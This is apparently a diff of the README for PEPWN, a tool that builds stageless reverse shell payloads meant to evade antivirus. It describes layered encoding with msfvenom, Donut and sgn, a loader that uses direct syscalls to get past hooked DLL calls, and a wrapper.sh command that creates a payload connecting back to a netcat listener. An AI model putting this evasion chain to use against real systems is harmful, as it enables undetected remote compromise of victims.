@@ -1,18 +1,18 @@
 # PEPWN
-PEPWN is a multi chained tool that has a goal to generate an undetectable reverse shell payload in different formats (PE, shellcode). The payload is stageless and it works without the need of Metasploit Handler, it just needs a TCP listener (using netcat).
+PEPWN is a multi-chained tool that has a goal to generate an undetectable reverse shell payload in different formats (PE, shellcode). The payload is stageless and it works without the need of Metasploit Handler, it just needs a TCP listener (using netcat).
 
 
 ## Overview
 
 >The creation of the payload in PEPWN is composed of 5 steps:
 
-- [x] it generate a payload with msfvenom.
-- [x] It uses the [DONUT](https://github.com/TheWover/donut/) project. That will convert the generated EXE payload and extract shellcode from it. It's just a project to facilitate extracting shellcodes from executable binaries
+- [x] It generates an exe payload using msfvenom with the given IP and PORT and saves it in the /tmp directory.
+- [x] It uses the [DONUT](https://github.com/TheWover/donut/) project. That will convert the generated EXE payload and extract shellcode from it. DONUT is just a project to facilitate extracting shellcodes from executable binaries
 - [x] Using the same project DONUT, the tool will apply an encoding logic on the generated payload. But the logic implemented by DONUT is going to get statically detectable because it's using a static pattern of encryption/encoding with a static key. That's why I used a second layer of encoding.
-- [x] apply 2nd layer of encoding using [sgn](https://github.com/egebalci/sgn/). sgn encodes shellcodes using LSFR algorithm with random key in every compilation.
-- [x] transfer it into a shellcode format of use ex: (base64, hex string, and raw data), or create exe file that triggers the shellcode using syscalls.
+- [x] Apply 2nd layer of encoding using [sgn](https://github.com/egebalci/sgn/). sgn encodes shellcodes using LSFR algorithm with random key in every compilation.
+- [x] Transfers it into a shellcode format of use ex: (base64, hex string, and raw data), or create exe file that triggers the shellcode using syscalls.
 
-If the user chooses to create exe file, the tool prepares a c++ file that invokes that shellcode with using syscalls instead of dll calls. For example instead of using "VirtualAlloc" dll call, it uses "NtAllocateVirtualMemory" syscall because the defender can easilly hook dll calls and detect the call to "VirtualAlloc" and consider it as malicious action.
+If the user chooses to create exe file, the tool prepares a c++ file that invokes the shellcode with using syscalls instead of dll calls. For example instead of using "VirtualAlloc" dll call, it uses "NtAllocateVirtualMemory" syscall because the defender can easilly hook dll calls and detect the call to "VirtualAlloc" and consider it as malicious action.
 
 ## Installation
 
@@ -34,6 +34,7 @@ Example:
 ```
 ./wrapper.sh -f 1 -h 127.0.0.1 -p 4444
 ```
+This command will create an EXE stageless reverse shell payload that connects back to 127.0.0.1 in port 4444. 
 
 ## Documentation
 
